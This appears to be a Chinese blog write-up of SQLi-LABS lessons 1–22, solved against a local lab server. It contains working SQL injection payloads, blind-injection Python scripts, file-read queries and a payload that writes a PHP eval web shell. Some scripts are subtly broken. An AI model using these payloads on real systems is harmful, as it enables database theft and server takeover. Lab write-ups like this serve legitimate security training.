class="code"><pre><span class="line">Ps:--+可以用#替换，url 提交过程中Url 编码后的#为%23</span><br><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>凡是出现这种有回显的报错是感觉是最好做的注入</p><p>常规步骤，<code>暴库-&gt;爆表-&gt;爆列</code><br>这里我们是多写了个单引号导致报错，我们可以从报错看得出来这里是单引号括着id参数<br>所以我们闭合单引号<br>构造我们需要的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27%23</code> 回显正常，说明猜测成功</p><p>去后台看一下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>是这样子的，没有任何过滤</p><p>然后开始用order by去猜列数<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27 order by 3%23</code>  得到表中应该是三列(用二分法去慢慢测)</p><p>然后开始用union select去回显某一列的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=-1%27</code> union select 1,2,3%23<br>这里我们需要把第一句话弄成结果为空才能显示后面一句话的内容，这里我选择id=-1，然后的话就可以回显2和3,后面就可以利用这两列回显你想要的东西了</p><p>下面我们就开始要用mysql里面自带的information_schema表了<br>猜表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>猜列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&apos;users&apos;%23</span><br></pre></td></tr></table></figure><p>才猜对应的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,concat_ws(&apos;%23&apos;,username,password)%20from users limit 0,1%23</span><br></pre></td></tr></table></figure><p>这一句话只能猜一行，所以要想看其他行的内容就必须要刷一下limit的内容了</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>很无聊，看一下源代码什么防御都没有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=1 order by 5</span><br></pre></td></tr></table></figure><p>测试得到3列，然后开始闭合，其实这一题直接注释了就好</p><p>直接上语句<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=-1 union select 1,2,3#</span><br></pre></td></tr></table></figure><p>这时候想测什么都可以了</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>可以猜测这里应该是一个单引号+括号闭合，测试一下对不对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=1&apos;) %23</span><br></pre></td></tr></table></figure><p>成功回显</p><p>再看看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>果然如此</p><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=-1&apos;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>尝试?id=1’单引号没有报错<br>尝试一下”,发现出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>猜测是<code>&quot;+）</code>的组合<br>闭合一下试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=1&quot;)%23</span><br></pre></td></tr></table></figure><p>成功回显<br>再看看源代码果然是这样<br>接下来就是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>根据<code>You are in</code>的有无来判断正确<br>输入id=1’出现报错回显<br>猜测是单引号的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5/?id=1%27%23</span><br></pre></td></tr></table></figure><p>尝试闭合一下出现回显，这个题目有两种做法，一种是直接尝试盲注，另一种是报错注入<br>首先来一个报错注入的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5?id=1&apos; and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>然后再来一个盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"><span class="comment">#url = "http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>输入?id=1’没有任何反应，双引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot;%23</span><br></pre></td></tr></table></figure><p>直接报错即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 4,1),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>是测试写文件的功能<br>直接输入单引号出现错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>这里得提及一下如果要读取以及写文件的话必须得需要权限，这里我借鉴了一部分内容<br>导入导出相关操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(file_name)：读取文件并返回该文件的内容作为一个字符串。</span><br></pre></td></tr></table></figure><p>使用条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A.必须有权限读取并且文件可读</span><br><span class="line"></span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。</span><br><span class="line"></span><br><span class="line">B.欲读取文件必须在服务器上。</span><br><span class="line">C.必须指定文件完整的路径</span><br><span class="line">D.欲读取文件必须小于max_allowed_packet。</span><br></pre></td></tr></table></figure><p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.绝对物理路径</span><br><span class="line">2.构造有效的畸形语句(报错爆出绝对路径)</span><br></pre></td></tr></table></figure></p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</span><br><span class="line">利用hex()将文件导出来，特别是smb文件</span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">explain：c:/boot.ini的十六进制是0x633s2f626f6f742e696e69</span><br><span class="line">-1 union select 1,1,1,load_file(C:\\boot.ini)</span><br><span class="line">explain：路径里的/用\\代替</span><br><span class="line">load data file导入数据库</span><br><span class="line">略。</span><br><span class="line">导入到文件中</span><br><span class="line">SELECT INTO OUTFILE ‘file_name’,具体参阅其他文章。</span><br><span class="line">file_name 不能是一个已经存在的文件。</span><br></pre></td></tr></table></figure><p>从源代码里面可以发现是要闭合)的，所以我们就可以这样去写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><p>连接成功<br><a href="https://imgchr.com/i/PXe8Ig" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXe8Ig.md.png" alt="PXe8Ig.md.png"></a></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>这一题源代码里面将有关报错信息全都注释了只能用盲注<br><a href="https://imgchr.com/i/PXetRs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXetRs.md.png" alt="PXetRs.md.png"></a><br>先测试发现还是直接一个单号然后加一个注释就可以坐后面的事情了<br>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.102/sqlilabs/Less-8/?id=1' and ascii(substr((select database()),&#123;_&#125;,1))</span></span><br><span class="line"><span class="string">&gt;&#123;__&#125; %23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">65</span></span><br><span class="line">    <span class="keyword">while</span> abs(max-min)&gt;<span class="number">1</span>:</span><br><span class="line">    mid = (max+min)//<span class="number">2</span></span><br><span class="line">    payload = url.format(_=i,__=mid)</span><br><span class="line">    ans = requests.get(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">    min = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    max = mid</span><br><span class="line">    database = database + chr(max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>这是一个时间盲注的题目<br>直接单引号闭合加个注释其实就ok了，这里就直接给个爆数据库的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-8/?id=1'and if(ascii(substr(database(),&#123;_&#125;,1))=&#123;__&#125;,1,sleep(3))--+'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()-start &gt;<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>也是一个时间盲注题目，不过这一题是双引号闭合，把上面的脚本改为双引号就好</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>是一个post表格的界面<br>上来就尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>再尝试Less-11一部分内容，发现不行，没有报错信息<br>尝试双引号<br>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;&quot;)</span><br></pre></td></tr></table></figure><p>应该是有一个括号的<br>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1 #</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><p>立即过</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>上一题的单引号版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这一体的注入点在password上，这也提醒了我们，注入点不一定是在第一个输入框内还有可能是第二输入框呢！<br>我们也可以从源代码的角度去分析，因为源代码写了个check函数去检查username而password反而漏了写<br>对应的password我们可以用报错注入去实现，用单引号闭合password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos;),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆详细信息<br>这时候输入这一句话的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select username from users),0x7e),1)#</span><br></pre></td></tr></table></figure><p>会出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</span><br></pre></td></tr></table></figure><p>这是mysql自身的问题不能同时对一个表又select又update，所以我们得构造另外一个表去子查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(1,concat(0x7e,(select username from (select username  from users)b limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure><p>介绍一下里面的过滤函数，其他两个很熟悉就不介绍了<br><code>mysql_real_escape_string()</code><br>函数转义SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>一进去就显示ip，可能是http头注入<br>查看源代码我们是要登录进去后才能注入，利用的是insert的那一部分语句<br>先在user-agent那里输入1’ 会出现报错<br><code>MySQL server version for the right syntax to use near &#39;127.0.0.1&#39;, &#39;admin&#39;)&#39;</code><br>再尝试一下<code>1&#39; and &#39;1&#39;=&#39;1</code><br>出现回显没有报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: 1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>现在就可以直接使用报错注入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>从上一题开始这里的每一道题目都需要登陆一下才行<br>这一次回显的是在referer上面<br>尝试在referer上面测试1’ and ‘1’=’1<br>直接回显<br>说明这一次的注入点是在referer上面<br>然后像刚才一样直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&apos; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>登陆后发现很明显的cookie字样猜测应该是cookie注入<br>退出后尝试在http头处尝试cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;;</span><br></pre></td></tr></table></figure><p>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>应该是单引号闭合<br>再尝试<br><code>uname=admin&#39; or &#39;1&#39;=&#39;1</code>成功回显<br>下面就很好办了，直接报错注入就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>这一题明显发现uname那一部分经过了base64加密<br>我们加上单引号再尝试加密发送看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4n</span><br></pre></td></tr></table></figure><p>出现跟上一题一样的报错，看来是一样的了，就是加上base64加密而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>把上面这一串base64加密就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICcxJz0nMQ==</span><br></pre></td></tr></table></figure><p>直接回显你想要的东西，成功</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这一题就是上一题的套路，只是把单引号笔换成了双引号而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4i</span><br></pre></td></tr></table></figure><p>出现报错<br>直接<code>admin&quot; or &quot;1&quot;=&quot;1</code> 闭合一下加密提交就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4iIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显正常<br>开始报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p>加密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显数据库成功</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>SQLi-LABS Page-1(Basic Challenges)的22题就已经全部完爆了<br>这里面的22道题目都是把一些常见的注入类型给过了一遍，我觉得大概都是四种类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入</span><br><span class="line">报错注入</span><br><span class="line">bool盲注</span><br><span class="line">时间盲注</span><br></pre></td></tr></table></figure><p>后面的从18关开始就开始是http头的注入，但无论是什么注入，关键是要找到注入点在哪里，然后用合适的方法去闭合相关语句，然后再用正常的语句去查询你所需要的信息就好了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>二分查找在sql盲注里面的应用</title>
    <link href="0verwatch.top/2018/08/27/bin-search-sql/"/>
    <id>0verwatch.top/2018/08/27/bin-search-sql/</id>
    <published>2018-08-27T02:53:50.000Z</published>
    <updated>2018-08-27T02:57:04.305Z</updated>
    
